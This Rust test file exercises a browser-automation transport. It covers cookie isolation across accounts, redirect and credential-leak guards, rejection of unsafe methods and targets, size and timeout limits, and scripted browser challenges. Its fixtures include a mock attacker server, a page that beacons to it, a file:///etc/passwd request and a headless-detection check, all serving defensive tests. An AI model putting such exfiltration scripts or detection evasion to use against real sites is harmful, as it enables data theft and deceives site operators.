use axum::{
    Router,
    body::Bytes,
    extract::Request,
    http::{HeaderMap, StatusCode},
    response::{Html, IntoResponse, Redirect},
    routing::{any, get},
};
use itda_browser::transport::{BrowserMode, BrowserRequest, BrowserTransport};
use std::{
    sync::{Arc, Mutex},
    time::Duration,
};

fn request(url: String, mode: BrowserMode) -> BrowserRequest {
    BrowserRequest {
        url,
        method: "GET".into(),
        headers: Vec::new(),
        body: None,
        account_id: "first".into(),
        credential_fingerprint: None,
        read_only: true,
        limit: 64 * 1024,
        // The first call starts the browser, which a busy CI runner can take
        // most of ten seconds to do.
        timeout: Duration::from_secs(30),
        allow_local: true,
        mode,
        cooldowns: Vec::new(),
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn rotated_credentials_discard_server_cookies_and_preserve_response_cookies() {
    if std::env::var_os("ITDA_TEST_BROWSER").is_none_or(|b| b.is_empty()) {
        eprintln!("skipped: set ITDA_TEST_BROWSER to run");
        return;
    }
    let router = Router::new()
        .route(
            "/session",
            get(|| async {
                (
                    [("set-cookie", "session=old-user; Path=/; HttpOnly")],
                    "session",
                )
            }),
        )
        .route(
            "/who",
            get(|headers: HeaderMap| async move {
                axum::Json(serde_json::json!({
                    "cookie": headers.get("cookie").and_then(|h| h.to_str().ok()),
                }))
            }),
        );
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let origin = format!("http://{}", listener.local_addr().unwrap());
    let server = tokio::spawn(async move { axum::serve(listener, router).await.unwrap() });
    let (headers, cookie) = tokio::task::spawn_blocking(move || {
        let mut transport = BrowserTransport::new();
        let mut first = request(format!("{origin}/session"), BrowserMode::Fetch);
        first.headers = vec![("authorization".into(), "Bearer first".into())];
        let first = transport.execute(first).unwrap();
        let mut second = request(format!("{origin}/who"), BrowserMode::Fetch);
        second.headers = vec![("authorization".into(), "Bearer second".into())];
        let second = transport.execute(second).unwrap();
        let body: serde_json::Value = serde_json::from_slice(&second.bytes).unwrap();
        (first.headers, body["cookie"].clone())
    })
    .await
    .unwrap();
    server.abort();
    let cookie_header = headers
        .into_iter()
        .find(|(key, _)| key.eq_ignore_ascii_case("set-cookie"))
        .map(|(_, value)| value);
    assert_eq!(
        (cookie_header, cookie),
        (
            Some("session=old-user; Path=/; HttpOnly".into()),
            serde_json::Value::Null
        )
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn retry_after_on_redirect_is_returned_without_following_it() {
    if std::env::var_os("ITDA_TEST_BROWSER").is_none_or(|b| b.is_empty()) {
        eprintln!("skipped: set ITDA_TEST_BROWSER to run");
        return;
    }
    let followed = Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let reached = followed.clone();
    let router = Router::new()
        .route(
            "/redirect",
            get(|| async {
                (
                    StatusCode::FOUND,
                    [("location", "/next"), ("retry-after", "60")],
                    "",
                )
            }),
        )
        .route(
            "/next",
            get(move || {
                reached.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
                async { "must not be sent" }
            }),
        );
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let origin = format!("http://{}", listener.local_addr().unwrap());
    let server = tokio::spawn(async move { axum::serve(listener, router).await.unwrap() });
    let responses = tokio::task::spawn_blocking(move || {
        [BrowserMode::Fetch, BrowserMode::Render].map(|mode| {
            BrowserTransport::new()
                .execute(request(format!("{origin}/redirect"), mode))
                .unwrap()
        })
    })
    .await
    .unwrap();
    server.abort();
    assert_eq!(followed.load(std::sync::atomic::Ordering::SeqCst), 0);
    for response in responses {
        assert_eq!(response.status, 302);
        assert!(
            response
                .headers
                .iter()
                .any(|(key, value)| key.eq_ignore_ascii_case("retry-after") && value == "60")
        );
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn redirected_cookie_updates_keep_the_final_value_last() {
    if std::env::var_os("ITDA_TEST_BROWSER").is_none_or(|b| b.is_empty()) {
        eprintln!("skipped: set ITDA_TEST_BROWSER to run");
        return;
    }
    let router = Router::new()
        .route(
            "/form",
            get(|| async {
                (
                    StatusCode::FOUND,
                    [("location", "/middle"), ("set-cookie", "sid=old; Path=/")],
                    "",
                )
            }),
        )
        .route(
            "/middle",
            get(|| async {
                (
                    StatusCode::FOUND,
                    [("location", "/final"), ("set-cookie", "sid=new; Path=/")],
                    "",
                )
            }),
        )
        .route(
            "/final",
            get(|| async { ([("set-cookie", "sid=old; Path=/")], "form") }),
        );
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let url = format!("http://{}/form", listener.local_addr().unwrap());
    let server = tokio::spawn(async move { axum::serve(listener, router).await.unwrap() });
    let response = tokio::task::spawn_blocking(move || {
        BrowserTransport::new()
            .execute(request(url, BrowserMode::Fetch))
            .unwrap()
    })
    .await
    .unwrap();
    server.abort();
    let cookies = response
        .headers
        .iter()
        .filter(|(name, _)| name == "set-cookie")
        .map(|(_, value)| value.split(';').next().unwrap())
        .collect::<Vec<_>>();
    assert_eq!(cookies, ["sid=old", "sid=new", "sid=old"]);
}

#[test]
fn rejects_invalid_requests_before_starting_a_browser() {
    let mut transport = BrowserTransport::new();
    let mut input = request("file:///etc/passwd".into(), BrowserMode::Fetch);
    assert!(transport.execute(input).is_err());
    input = request("http://127.0.0.1:1/".into(), BrowserMode::Fetch);
    input.allow_local = false;
    assert_eq!(
        transport.execute(input).unwrap_err().public_code,
        "unsafe_target"
    );
    input = request("https://example.com/".into(), BrowserMode::Render);
    input.method = "POST".into();
    assert_eq!(
        transport.execute(input).unwrap_err().public_code,
        "unsafe_method"
    );
    let mut input = request("https://example.com/".into(), BrowserMode::Fetch);
    input.read_only = false;
    assert_eq!(
        transport.execute(input).unwrap_err().public_code,
        "unsafe_method"
    );
}

#[test]
fn installed_browser_identity_is_cached_without_opening_a_page() {
    if std::env::var_os("ITDA_TEST_BROWSER").is_none_or(|b| b.is_empty()) {
        eprintln!("skipped: set ITDA_TEST_BROWSER to run");
        return;
    }
    let agent = itda_browser::transport::user_agent().unwrap();
    assert!(agent.contains("Chrome/"));
    assert!(!agent.contains("HeadlessChrome"));
    assert_eq!(itda_browser::transport::user_agent(), Some(agent));
}

#[test]
fn unavailable_browser_is_a_recoverable_transport_error() {
    if !std::env::var_os("ITDA_BROWSER").is_some_and(|path| !std::path::Path::new(&path).exists()) {
        return;
    }
    let mut transport = BrowserTransport::new();
    let input = request("http://127.0.0.1:1/".into(), BrowserMode::Fetch);
    assert_eq!(
        transport.execute(input).unwrap_err().public_code,
        "browser_unavailable"
    );
    assert!(itda_browser::transport::user_agent().is_none());
}

#[tokio::test(flavor = "multi_thread")]
async fn installed_browser_fetch_render_reuse_isolation_and_guards() {
    if std::env::var_os("ITDA_TEST_BROWSER").is_none_or(|b| b.is_empty()) {
        eprintln!("skipped: set ITDA_TEST_BROWSER and ITDA_BROWSER to an installed browser");
        return;
    }
    let seen = Arc::new(Mutex::new(Vec::<String>::new()));
    let leaked = Arc::new(Mutex::new(Vec::<String>::new()));
    let attacker = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let attacker_url = format!("http://{}/stolen", attacker.local_addr().unwrap());
    let attacker_log = leaked.clone();
    let attacker_server = tokio::spawn(async move {
        axum::serve(
            attacker,
            Router::new().fallback(any(move |headers: HeaderMap| {
                let log = attacker_log.clone();
                async move {
                    log.lock().unwrap().push(format!("{headers:?}"));
                    "stolen"
                }
            })),
        )
        .await
        .unwrap();
    });
    let log = seen.clone();
    let redirect_url = attacker_url.clone();
    let external_page = format!(
        "<html><body><script>fetch({0:?}).catch(()=>{{}}); navigator.sendBeacon({0:?}, 'bad');</script><img src={0:?}><iframe src={0:?}></iframe><a id='pop' href={0:?} target='_blank'>open</a><script>document.getElementById('pop').click()</script></body></html>",
        attacker_url,
    );
    let router = Router::new()
        .route(
            "/echo",
            any(move |headers: HeaderMap, method: axum::http::Method, body: Bytes| {
                let log = log.clone();
                async move {
                    log.lock().unwrap().push(format!("{method} /echo"));
                    (
                        StatusCode::ACCEPTED,
                        [("x-fixture", "real")],
                        axum::Json(serde_json::json!({
                            "method": method.as_str(),
                            "body": body.to_vec(),
                            "cookie": headers.get("cookie").and_then(|h| h.to_str().ok()),
                            "authorization": headers.get("authorization").and_then(|h| h.to_str().ok()),
                            "agent": headers.get("user-agent").and_then(|h| h.to_str().ok()),
                        })),
                    )
                }
            }),
        )
        .route("/render", get(|| async {
            (StatusCode::NON_AUTHORITATIVE_INFORMATION, Html(
                "<html><body><h1>initial</h1><script>
                document.querySelector('h1').textContent = 'rendered';
                fetch('/forbidden', {method:'POST'});
                fetch('/delete').catch(()=>{});
                fetch('/echo').then(r=>r.json()).then(x=>{
                  document.querySelector('h1').textContent = 'async-rendered';
                });
                </script></body></html>"
            ))
        }))
        .route("/large", get(|| async { "x".repeat(128 * 1024) }))
        .route("/wait", get(|| async { std::future::pending::<String>().await }))
        .route("/redirect", get(move || {
            let url = redirect_url.clone();
            async move { Redirect::temporary(&url) }
        }))
        .route("/external", get(move || {
            let page = external_page.clone();
            async move { Html(page) }
        }))
        .route("/redirect-same", get(|| async { Redirect::temporary("/echo") }))
        .route("/set-cookie", get(|| async {
            ([("set-cookie", "stale=secret; Path=/")], "set")
        }))
        .route("/challenge", get(|headers: HeaderMap| async move {
            if headers.get("cookie").and_then(|h| h.to_str().ok()).is_some_and(|h| h.contains("challenge=passed")) {
                return (StatusCode::OK, Html("<h1>challenge passed</h1>")).into_response();
            }
            (StatusCode::FORBIDDEN, Html("<html><body>challenge<script>document.cookie='challenge=passed; Path=/'; document.body.innerHTML='<h1>solved by script</h1>';</script></body></html>")).into_response()
        }))
        .route("/late-challenge", get(|| async {
            (StatusCode::FORBIDDEN, Html(
                "<html><body><h1>Checking your browser</h1><script>
                addEventListener('load', () => requestAnimationFrame(() => requestAnimationFrame(() => {
                    document.cookie='late=passed; Path=/';
                    document.body.replaceChildren(Object.assign(document.createElement('h1'), {textContent:'late script completed'}));
                })));
                </script></body></html>"
            ))
        }))
        .route("/forbidden", any({
            let seen = seen.clone();
            move |_: Request| {
                let seen = seen.clone();
                async move {
                    seen.lock().unwrap().push("UNSAFE".into());
                    "unsafe".into_response()
                }
            }
        }))
        .route("/delete", get({
            let seen = seen.clone();
            move || {
                let seen = seen.clone();
                async move {
                    seen.lock().unwrap().push("UNSAFE GET".into());
                    "deleted"
                }
            }
        }));
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let origin = format!("http://{}", listener.local_addr().unwrap());
    let server = tokio::spawn(async move { axum::serve(listener, router).await.unwrap() });
    let origin_for_run = origin.clone();
    tokio::task::spawn_blocking(move || {
        let mut transport = BrowserTransport::new();
        let mut input = request(format!("{origin_for_run}/echo"), BrowserMode::Fetch);
        input.method = "POST".into();
        input.body = Some(vec![0, 255, 42]);
        input.headers = vec![
            ("Cookie".into(), "sid=first".into()),
            ("Authorization".into(), "Bearer first".into()),
            ("Content-Type".into(), "application/octet-stream".into()),
        ];
        let started = std::time::Instant::now();
        let result = transport.execute(input).unwrap();
        eprintln!("browser transport cold fetch: {:?}", started.elapsed());
        assert_eq!(result.status, 202);
        assert!(
            result
                .headers
                .iter()
                .any(|(k, v)| k == "x-fixture" && v == "real")
        );
        let echo: serde_json::Value = serde_json::from_slice(&result.bytes).unwrap();
        assert_eq!(echo["method"], "POST");
        assert_eq!(echo["body"], serde_json::json!([0, 255, 42]));
        assert_eq!(echo["cookie"], "sid=first");
        assert_eq!(echo["authorization"], "Bearer first");
        assert!(echo["agent"].as_str().unwrap().contains("Chrome/"));

        transport
            .execute(request(
                format!("{origin_for_run}/set-cookie"),
                BrowserMode::Fetch,
            ))
            .unwrap();
        for account in ["first", "second", "first"] {
            let mut input = request(format!("{origin_for_run}/echo"), BrowserMode::Fetch);
            input.account_id = account.into();
            let started = std::time::Instant::now();
            let result = transport.execute(input).unwrap();
            eprintln!(
                "browser transport warm fetch {account}: {:?}",
                started.elapsed()
            );
            let echo: serde_json::Value = serde_json::from_slice(&result.bytes).unwrap();
            if account == "first" {
                assert_eq!(echo["cookie"], "stale=secret", "{echo}");
            } else {
                assert!(echo["cookie"].is_null(), "{echo}");
            }
            assert!(echo["authorization"].is_null(), "{echo}");
        }
        let solved = transport
            .execute(request(
                format!("{origin_for_run}/challenge"),
                BrowserMode::Render,
            ))
            .unwrap();
        assert_eq!(solved.status, 403);
        assert!(
            String::from_utf8(solved.bytes)
                .unwrap()
                .contains("<h1>solved by script</h1>")
        );
        let passed = transport
            .execute(request(
                format!("{origin_for_run}/challenge"),
                BrowserMode::Fetch,
            ))
            .unwrap();
        assert_eq!(passed.status, 200);
        assert!(
            String::from_utf8(passed.bytes)
                .unwrap()
                .contains("challenge passed")
        );
        let late = transport
            .execute(request(
                format!("{origin_for_run}/late-challenge"),
                BrowserMode::Render,
            ))
            .unwrap();
        assert_eq!(late.status, 403);
        assert!(
            String::from_utf8(late.bytes)
                .unwrap()
                .contains("<h1>late script completed</h1>")
        );
        let rendered = transport
            .execute(request(
                format!("{origin_for_run}/render"),
                BrowserMode::Render,
            ))
            .unwrap();
        assert_eq!(rendered.status, 203);
        assert!(
            String::from_utf8(rendered.bytes)
                .unwrap()
                .contains("<h1>async-rendered</h1>")
        );
        for mode in [BrowserMode::Fetch, BrowserMode::Render] {
            let mut input = request(format!("{origin_for_run}/redirect"), mode);
            input.headers = vec![
                ("Authorization".into(), "Bearer never-leak".into()),
                ("Cookie".into(), "secret=never-leak".into()),
            ];
            assert!(transport.execute(input).is_err());
        }
        transport
            .execute(request(
                format!("{origin_for_run}/external"),
                BrowserMode::Render,
            ))
            .unwrap();
        let redirected = transport
            .execute(request(
                format!("{origin_for_run}/redirect-same"),
                BrowserMode::Fetch,
            ))
            .unwrap();
        assert_eq!(redirected.status, 202);
        assert_eq!(redirected.url, format!("{origin_for_run}/echo"));
        let mut large = request(format!("{origin_for_run}/large"), BrowserMode::Fetch);
        large.limit = 8;
        assert_eq!(
            transport.execute(large).unwrap_err().public_code,
            "response_too_large"
        );
        let mut slow = request(format!("{origin_for_run}/wait"), BrowserMode::Fetch);
        slow.timeout = Duration::from_millis(300);
        assert_eq!(transport.execute(slow).unwrap_err().public_code, "timeout");
    })
    .await
    .unwrap();
    server.abort();
    attacker_server.abort();
    for request in leaked.lock().unwrap().iter() {
        assert!(!request.contains("never-leak"), "{request}");
    }
    let seen = seen.lock().unwrap();
    assert!(!seen.iter().any(|s| s.starts_with("UNSAFE")), "{seen:?}");
    assert_eq!(
        seen.iter().filter(|s| *s == "POST /echo").count(),
        1,
        "{seen:?}"
    );
    assert_eq!(
        seen.iter().filter(|s| *s == "GET /echo").count(),
        5,
        "{seen:?}"
    );
}
